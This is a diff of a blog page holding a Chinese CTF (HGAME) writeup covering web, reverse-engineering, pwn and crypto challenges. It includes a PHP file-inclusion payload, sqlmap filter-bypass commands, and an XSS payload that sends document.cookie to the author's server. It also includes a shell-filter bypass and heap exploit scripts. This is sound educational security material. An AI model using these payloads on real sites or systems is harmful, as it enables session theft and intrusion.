@@ -378,40 +378,44 @@
     <div class="post-body" itemprop="articleBody">
         <p>因为图片url要替换，这些工作量有点大，现在才弄好。请收下这份迟来的writeup</p>
 <span id="more"></span>
-<h2 id="Web">Web</h2>
-<h3 id="Cosmos的博客后台">Cosmos的博客后台</h3>
-<p>点击链接后跳转到url：<a target="_blank" rel="external nofollow noopener noreferrer" href="http://cosmos-admin.hgame.day-day.work/?action=login.php">http://cosmos-admin.hgame.day-day.work/?action=login.php</a></p>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><p>点击链接后跳转到url：<a target="_blank" rel="external nofollow noopener noreferrer" href="http://cosmos-admin.hgame.day-day.work/?action=login.php">http://cosmos-admin.hgame.day-day.work/?action=login.php</a></p>
 <p>多次测试这个action参数发现，有文件包含漏洞，利用php伪协议，读取login.php源码</p>
 <pre class="line-numbers language-none"><code class="language-none">?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;login.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>得到数据base64解码写入文件查看：</p>
 <p><img src="/images/1966f4b8/web-1-2.png" alt="2"></p>
 <p>猜测这个DEBUG_MODE是true，那么访问login.php页面，传入参数</p>
 <pre class="line-numbers language-none"><code class="language-none">?debug&#x3D;admin_username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>可以得到变量admin_username的内容为<code>Cosmos!</code>，依次可以得到admin_password的内容为<code>0e114902927253523756713132279690</code></p>
 <p>且有：<img src="/images/1966f4b8/web-1-5.png" alt="5"></p>
 <p>密码md5值是<code>0e</code>开头的，如果这个md5值和另一个<code>0e</code>开头的字符串用<code>==</code>比较，php会认为这两个字符串是浮点数的科学计数法，会转化成数字再比较，0的任何次幂都是0，那么只要找一个字符串的md5值同样是<code>0e</code>开头的就可以了，百度一个即可，登录后进入后台页面admin.php，同样先利用前面的文件包含漏洞读取admin.php的源码</p>
-<p><img src="/images/1966f4b8/web-1-8.png" alt="8"><img src="/images/1966f4b8/web-1-7.png" alt="7"></p>
+<p><img src="/images/1966f4b8/web-1-8.png" alt="8">)<img src="/images/1966f4b8/web-1-7.png" alt="7"></p>
 <p>那么图片url构造为</p>
 <pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;localhost&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>把结果base64解码即可</p>
 <hr>
-<h3 id="Cosmos的留言板-1">Cosmos的留言板-1</h3>
-<p>url为<a target="_blank" rel="external nofollow noopener noreferrer" href="http://139.199.182.61/index.php?id=1">http://139.199.182.61/index.php?id=1</a></p>
+<h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>url为<a target="_blank" rel="external nofollow noopener noreferrer" href="http://139.199.182.61/index.php?id=1">http://139.199.182.61/index.php?id=1</a></p>
 <p>这个id存在sql注入，经过测试，过滤了空格还有一些关键词如<code>select</code>，不过关键词的过滤是大小写区分的，而且只过滤了一次，所以可以大小写混合绕过或者双写绕过如：<code>seLect</code>或者<code>selselectect</code>。空格可以用注释替代比如：<code>and 1=1</code>可以换成<code>and/**/1=1</code></p>
 <p>知道过滤了哪些之后，上sqlmap。</p>
 <p>关键词过滤用大小写随机绕过脚本<code>randomcase.py</code>，空格替换成注释<code>space2comment.py</code></p>
 <p>检测注入：</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;139.199.182.61&#x2F;index.php?id&#x3D;1 --tamper&#x3D;randomcase.py,space2comment.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>然后获取数据库名称：</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;139.199.182.61&#x2F;index.php?id&#x3D;1 --tamper&#x3D;randomcase.py,space2comment.py -current-db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>得知数据库名称为<code>easysql</code>，然后获取数据表：</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;139.199.182.61&#x2F;index.php?id&#x3D;1 --tamper&#x3D;randomcase.py,space2comment.py -D easysql -tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>得知有一个表为<code>f1aggggggggggggg</code>，应该是存放了flag，dump出这个表：</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;139.199.182.61&#x2F;index.php?id&#x3D;1 --tamper&#x3D;randomcase.py,space2comment.py -D easysql -T f1aggggggggggggg -dump-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>flag就出来了</p>
 <hr>
-<h3 id="Cosmos的新语言">Cosmos的新语言</h3>
-<p>根据页面内容，可知读取了mycode这个文件的内容作为eval的参数，那么先去看看能不能访问mycode这个文件，<a target="_blank" rel="external nofollow noopener noreferrer" href="http://2482d2a5eb.php.hgame.n3ko.co/mycode">http://2482d2a5eb.php.hgame.n3ko.co/mycode</a>发现可以看到文件内容：</p>
+<h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>根据页面内容，可知读取了mycode这个文件的内容作为eval的参数，那么先去看看能不能访问mycode这个文件，<a target="_blank" rel="external nofollow noopener noreferrer" href="http://2482d2a5eb.php.hgame.n3ko.co/mycode">http://2482d2a5eb.php.hgame.n3ko.co/mycode</a>发现可以看到文件内容：</p>
 <p><img src="/images/1966f4b8/web-3-2.png" alt="2"></p>
 <p>那么只要解密出这个token，拿这个token去访问url <code>http://2482d2a5eb.php.hgame.n3ko.co/</code>就得了，但是这个mycode的加密的方式会变化，学长还说每隔5秒变一次，那就要写脚本了，而且这个加密方式无非就<code>base64_encode</code>，<code>strrev</code>，<code>encrypt</code>，<code>str_rot13</code>这四种，比较好写，我的脚本如下：</p>
 <pre class="line-numbers language-python2" data-language="python2"><code class="language-python2">#!&#x2F;bin&#x2F;python2
@@ -501,23 +505,24 @@ token &#x3D; decrypt_token(encrypt_token, methods)
 flag &#x3D; submit(s, token)
 
 print flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<h3 id="Cosmos的聊天室">Cosmos的聊天室</h3>
-<p>其实就是xss，不过有些防护，不断测试（省略无数次失败），发现<code>&lt;xxx&gt;</code>这样的会被过滤掉，<code>&lt;xxx</code>到不会被过滤掉，也就是只要尖括号成对出现都会被过滤掉，之前学到浏览器有容错性什么的，那就试试<code>&lt;xxx &lt;!--</code>。</p>
+<h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><p>其实就是xss，不过有些防护，不断测试（省略无数次失败），发现<code>&lt;xxx&gt;</code>这样的会被过滤掉，<code>&lt;xxx</code>到不会被过滤掉，也就是只要尖括号成对出现都会被过滤掉，之前学到浏览器有容错性什么的，那就试试<code>&lt;xxx &lt;!--</code>。</p>
 <p>后面的<code>&lt;!--</code>把后面的内容都注释掉，前面的<code>&lt;xxx</code>很可能被解析成<code>&lt;xxx&gt;</code>标签，于是尝试</p>
 <p><code>&lt;img src=1 onerror=alert(1) &lt;!--</code></p>
 <p>经过过滤后变成：</p>
 <p><img src="/images/1966f4b8/web-4-8.png" alt="8"></p>
 <p>发现全部转成大写了，alert变成了ALERT，那不行，那把onerror的内容全部编码成HTML实体编码：</p>
 <p><code>&lt;img src=1 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; &lt;!--</code></p>
-<p>在浏览器里试，发现成功弹窗了，那想办法，让其获取<code>http://c-chat.hgame.babelfish.ink/flag</code>的内容，通过url跳转到我的一个域名上，传参数为内容如<code>window.location='http://xxx/?flag=content'</code>，这样查看我的服务器的日志就可以看到这个content了，还有那个验证码爆破一些数，md5前6位符合就行。</p>
-<p>但是试了很多遍都不行，本地成功了。问过学长，原来是那个机器人不能访问``http://c-chat.hgame.babelfish.ink/flag`这个链接。。。</p>
+<p>在浏览器里试，发现成功弹窗了，那想办法，让其获取<code>http://c-chat.hgame.babelfish.ink/flag</code>的内容，通过url跳转到我的一个域名上，传参数为内容如<code>window.location=&#39;http://xxx/?flag=content&#39;</code>，这样查看我的服务器的日志就可以看到这个content了，还有那个验证码爆破一些数，md5前6位符合就行。</p>
+<p>但是试了很多遍都不行，本地成功了。问过学长，原来是那个机器人不能访问``<a target="_blank" rel="external nofollow noopener noreferrer" href="http://c-chat.hgame.babelfish.ink/flag`这个链接。。。">http://c-chat.hgame.babelfish.ink/flag`这个链接。。。</a></p>
 <p>然后我就直接把cookie给窃取过来，然后我自己访问吧</p>
 <p>onerror对应的js代码如下：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     img<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'http://我的域名/?token='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>记得编码成HTML实体编码。</p>
 <p>顺便写成脚本一步到位：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
@@ -577,33 +582,33 @@ text <span class="token operator">=</span> send<span class="token punctuation">(
 <span class="token comment"># 提交验证码，让刚刚的payload生效</span>
 r <span class="token operator">=</span> submit<span class="token punctuation">(</span>s<span class="token punctuation">,</span> code<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>记得把对应的payload换成自己的，然后查看服务器日志得到cookie</p>
 <p><img src="/images/1966f4b8/web-4-9.png" alt="9"></p>
-<p>然后<img src="/images/1966f4b8/web-4-7.png" alt="7">带上cookie访问<a target="_blank" rel="external nofollow noopener noreferrer" href="http://c-chat.hgame.babelfish.ink/flag">http://c-chat.hgame.babelfish.ink/flag</a>即可</p>
+<p>然后<img src="/images/1966f4b8/web-4-7.png" alt="7">)带上cookie访问<a target="_blank" rel="external nofollow noopener noreferrer" href="http://c-chat.hgame.babelfish.ink/flag">http://c-chat.hgame.babelfish.ink/flag</a>即可</p>
 <hr>
-<h2 id="Re">Re</h2>
-<h3 id="unpack">unpack</h3>
-<p>学长给的学习资料直接就跟着脱壳，脱完壳后很简单了，关键逻辑就这样：</p>
+<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h3><p>学长给的学习资料直接就跟着脱壳，脱完壳后很简单了，关键逻辑就这样：</p>
 <p><img src="/images/1966f4b8/re-1-1.png" alt="1"></p>
 <p><code>byte_6CA0A0</code>这个数组也知道了</p>
 <p><img src="/images/1966f4b8/re-1-2.png" alt="2"></p>
 <p>直接解就好</p>
 <hr>
-<h3 id="Classic-CrackMe">Classic_CrackMe</h3>
-<p>这个程序是C# .net写的，IDA看汇编很复杂的样子，后发现有反编译的软件，找一个来反编译，然后找到关键代码</p>
+<h3 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h3><p>这个程序是C# .net写的，IDA看汇编很复杂的样子，后发现有反编译的软件，找一个来反编译，然后找到关键代码</p>
 <p><img src="/images/1966f4b8/re-2-1.png" alt="1"></p>
 <p>flag的形式就是，<code>hgame&#123;</code>+base64iv+str+<code>&#125;</code>，这个base64iv其实就是AES的初始向量，查过初始向量的作用就是加密前（解密类似）先和明文做一个异或操作，大概如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">明文 xor iv --key--&gt; 密文<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>那么可以看到上面第一个红框，通过不同的初始向量，同样的密钥，解密出来的结果是不一样的</p>
 <pre class="line-numbers language-none"><code class="language-none">&#39;Learn principles&#39; xor iv1 --key--&gt; 密文
 &#39;Same_ciphertext_&#39; xor iv2 --key--&gt; 密文<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>第一行的明文是根据上面的aes2来解密出来的，现在已知<code>'Learn principles' </code>，iv1和<code>'Same_ciphertext_'</code>，很容易确定通过异或可以得到iv2也就是我们的base64iv，即：</p>
+
+<p>第一行的明文是根据上面的aes2来解密出来的，现在已知<code>&#39;Learn principles&#39;</code>，iv1和<code>&#39;Same_ciphertext_&#39;</code>，很容易确定通过异或可以得到iv2也就是我们的base64iv，即：</p>
 <pre class="line-numbers language-none"><code class="language-none">&#39;Learn principles&#39; xor &#39;Same_ciphertext_&#39; xor iv1 &#x3D;&#x3D; iv2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>同样那个str也很好算，AES加密是分组加密的（这里是CBC模式），128bit一组，上一组加密的结果作为下一组加密的向量，而且text2刚好是一个分组，str刚好是第二个分组，知道text2也就知道用于与str异或的向量了，那直接在源码上动手解<img src="/images/1966f4b8/re-2-2.png" alt="2"></p>
 <p>可以得到base64iv和str，从而得到flag</p>
 <hr>
-<h3 id="babyPy">babyPy</h3>
-<p>学点python字节码的东西，勉强还原python代码如下：</p>
+<h3 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h3><p>学点python字节码的东西，勉强还原python代码如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">def encrypt(flag):
     O0O &#x3D; OOo[0:0:-1]
 
@@ -613,6 +618,7 @@ r <span class="token operator">=</span> submit<span class="token punctuation">(<
         Oo &#x3D; O0o[O0] ^ O0o[O0 - 1] 
         O0o[O0] &#x3D; Oo
     return hex(bytes(O0o))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>就是先反转，然后每一个数与前一个数异或，解密exp如下：</p>
 <pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;python2
 #coding&#x3D;utf8
@@ -635,9 +641,9 @@ def decrypt(data):
 
 flag &#x3D; decrypt(encrypt_data)
 print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<h3 id="babyPyc">babyPyc</h3>
-<p>死磕python字节码，注意点：要用对应版本的python</p>
+<h3 id="babyPyc"><a href="#babyPyc" class="headerlink" title="babyPyc"></a>babyPyc</h3><p>死磕python字节码，注意点：要用对应版本的python</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> marshal<span class="token punctuation">,</span>dis
 <span class="token operator">>></span><span class="token operator">></span> f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'c.pyc'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
 <span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># python3.7版本的pyc文件头有变化，变成16个字节了</span>
@@ -653,6 +659,9 @@ print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span
              <span class="token number">12</span> LOAD_CONST               <span class="token number">1</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>
              <span class="token number">14</span> IMPORT_NAME              <span class="token number">1</span> <span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <p>根据dis.dis(code)出来的类似汇编的代码，还原出源码大概是这样的：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>sys
 <span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode
@@ -705,6 +714,7 @@ ciphers <span class="token operator">=</span> b64encode<span class="token punctu
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Great, this is my flag.'</span><span class="token punctuation">)</span>
 <span class="token keyword">else</span><span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong flag.'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>可以看到，每一行的值都加上了下一行（并且对256取模），最后一行肯定是没有变的，可以倒推前面几行。按照这个思路，写出解密脚本：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
 
@@ -730,23 +740,21 @@ s <span class="token operator">=</span> <span class="token string">''</span>
 s <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
 
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hgame&#123;%s&#125;'</span> <span class="token operator">%</span> s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<h2 id="Pwn">Pwn</h2>
-<h3 id="findyourself">findyourself</h3>
-<p>（据说是辣个男人出的题，太难了）</p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="findyourself"><a href="#findyourself" class="headerlink" title="findyourself"></a>findyourself</h3><p>（据说是辣个男人出的题，太难了）</p>
 <p>首先是让你执行一条命令，然后让你猜当前目录位置，猜对了后面还有一次执行命令的机会，首先当然是想执行<code>cat flag</code>或者<code>pwd</code>啦，可惜不行，有检查</p>
 <p><img src="/images/1966f4b8/pwn-1-3.png" alt="3"></p>
 <p>那么当务之急当然是想办法获取当前目录位置啦，不能有pwd等单词，而且命令只能有数字字母和<code>-</code>，依稀记得linux有个文件系统对应内存区域，被挂载在<code>/proc</code>，赶紧去查下<code>/proc</code>下都有什么，发现<code>/proc/self/cwd</code>是当前目录的一个连接(link)，那么执行命令<code>ls -l /proc/self/cwd</code>即可看到连接到哪里了，也就是当前目录是哪。</p>
 <p>然后还有一次执行命令的机会，限制如下：</p>
 <p><img src="/images/1966f4b8/pwn-1-4.png" alt="4"></p>
 <p><img src="/images/1966f4b8/pwn-1-5.png" alt="5"></p>
-<p>第一个限制就是不能出现sh和cat，还有一些shell的元字符，然后就是关闭了输出流，也就是所有输出都看不到，可以通过<code>exec /bin/sh 1&gt;&amp;0</code>将输出流重定向到0（0不是stdin吗？其实0,1,2都是绑定到同一个tty里的），我们可以先通过执行<code>/bin/'s'h</code>来绕过<code>sh</code>这个词的限制，然后再执行<code>exec /bin/sh 1&gt;&amp;0</code>打开输出流</p>
-<p>第一步有很多方法，除了<code>/bin/'s'h</code>还可以<code>$0</code>（具体可以查$0这个变量是什么意思，这个是做完后学长说的，据说这才是预期解），我还想到一个<code>/bin/?h</code>，用<code>?</code>通配符，这里没有限制这个元字符</p>
+<p>第一个限制就是不能出现sh和cat，还有一些shell的元字符，然后就是关闭了输出流，也就是所有输出都看不到，可以通过<code>exec /bin/sh 1&gt;&amp;0</code>将输出流重定向到0（0不是stdin吗？其实0,1,2都是绑定到同一个tty里的），我们可以先通过执行<code>/bin/&#39;s&#39;h</code>来绕过<code>sh</code>这个词的限制，然后再执行<code>exec /bin/sh 1&gt;&amp;0</code>打开输出流</p>
+<p>第一步有很多方法，除了<code>/bin/&#39;s&#39;h</code>还可以<code>$0</code>（具体可以查$0这个变量是什么意思，这个是做完后学长说的，据说这才是预期解），我还想到一个<code>/bin/?h</code>，用<code>?</code>通配符，这里没有限制这个元字符</p>
 <p>我的操作如下：</p>
 <p><img src="/images/1966f4b8/pwn-1-2.png" alt="2"></p>
 <hr>
-<h3 id="Roc826s-Note">Roc826s_Note</h3>
-<p>关于堆的题，呃，我糊里糊涂就pwn出来了，堆还似懂非懂的，那怎么写wp呢？</p>
+<h3 id="Roc826s-Note"><a href="#Roc826s-Note" class="headerlink" title="Roc826s_Note"></a>Roc826s_Note</h3><p>关于堆的题，呃，我糊里糊涂就pwn出来了，堆还似懂非懂的，那怎么写wp呢？</p>
 <p>呃。。。大概思路就是通过UAF泄露unsorted bin的地址，从而计算出libc的基址。然后通过double free来控制fast bin，使得malloc到一块想要写数据的地址，这里选取<code>__malloc_hook</code>这个区域，这个区域是存一个函数地址，然后malloc的时候会调用这个函数，只要把这块区域改写成one_gadget的地址，再malloc就可以getshell了。double free的利用方法可以参考一下这篇文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a></p>
 <p>具体看我的exp：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
@@ -837,9 +845,9 @@ io<span class="token punctuation">.</span>sendlineafter<span class="token punctu
 <span class="token comment">#gdb.attach(io)</span>
 
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<h3 id="Another-Heaven">Another_Heaven</h3>
-<p>关键点：</p>
+<h3 id="Another-Heaven"><a href="#Another-Heaven" class="headerlink" title="Another_Heaven"></a>Another_Heaven</h3><p>关键点：</p>
 <p><img src="/images/1966f4b8/pwn-3-1.png" alt="1"></p>
 <p>可以通过第一处红框的代码，写入<code>\x00</code>就是字符串结束符，来截断flag，结合第二个红框处验证，爆破flag</p>
 <p>exp如下：</p>
@@ -886,9 +894,9 @@ flag <span class="token operator">=</span> <span class="token string">'hgame&#12
             <span class="token keyword">if</span> ch <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>
                 exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
             <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<h3 id="形而上的坏死">形而上的坏死</h3>
-<p>首先要知道的是，栈上面有个返回地址，是返回到<code>__libc_start_main</code>那边的，可以泄露出来得到libc的基址。</p>
+<h3 id="形而上的坏死"><a href="#形而上的坏死" class="headerlink" title="形而上的坏死"></a>形而上的坏死</h3><p>首先要知道的是，栈上面有个返回地址，是返回到<code>__libc_start_main</code>那边的，可以泄露出来得到libc的基址。</p>
 <p>利用的漏洞点：</p>
 <p><img src="/images/1966f4b8/pwn-4-2.png" alt="2"></p>
 <p><img src="/images/1966f4b8/pwn-4-3.png" alt="3"></p>
@@ -966,10 +974,9 @@ io<span class="token punctuation">.</span>sendafter<span class="token punctuatio
 <span class="token comment">#sleep(1)</span>
 
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<h2 id="Crypto">Crypto</h2>
-<h3 id="Verification-code">Verification_code</h3>
-<p>问就是爆破，脚本如下：</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Verification-code"><a href="#Verification-code" class="headerlink" title="Verification_code"></a>Verification_code</h3><p>问就是爆破，脚本如下：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python2</span>
 <span class="token comment">#coding=utf8</span>
 
@@ -1007,9 +1014,9 @@ _hexdigest <span class="token operator">=</span> io<span class="token punctuatio
         <span class="token keyword">break</span>
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<h3 id="Remainder">Remainder</h3>
-<p>孙子定理套公式，得到<code>c = m的e次方 % (p*q*r)</code>，然后直接开方！（我就是蠢成这样）</p>
+<h3 id="Remainder"><a href="#Remainder" class="headerlink" title="Remainder"></a>Remainder</h3><p>孙子定理套公式，得到<code>c = m的e次方 % (p*q*r)</code>，然后直接开方！（我就是蠢成这样）</p>
 <p>当然不是这么搞，问了下学长，当成rsa来搞.</p>
 <p>因为p,q,r都是质数，所以那个欧拉函数（是这么叫的吧）就是</p>
 <p><code>phi = (p-1)*(q-1)*(r*1)</code></p>
@@ -1056,9 +1063,9 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
     flag <span class="token operator">+=</span> line<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
 
 <span class="token keyword">print</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <hr>
-<h3 id="notRC4">notRC4</h3>
-<p>RC4的最后状态的S盒已知，倒推每一步的状态，但是有个索引j（查查RC4的资料吧）不知道，想了一下午，最终学长给hint说可以枚举，呃，又是爆破。。。</p>
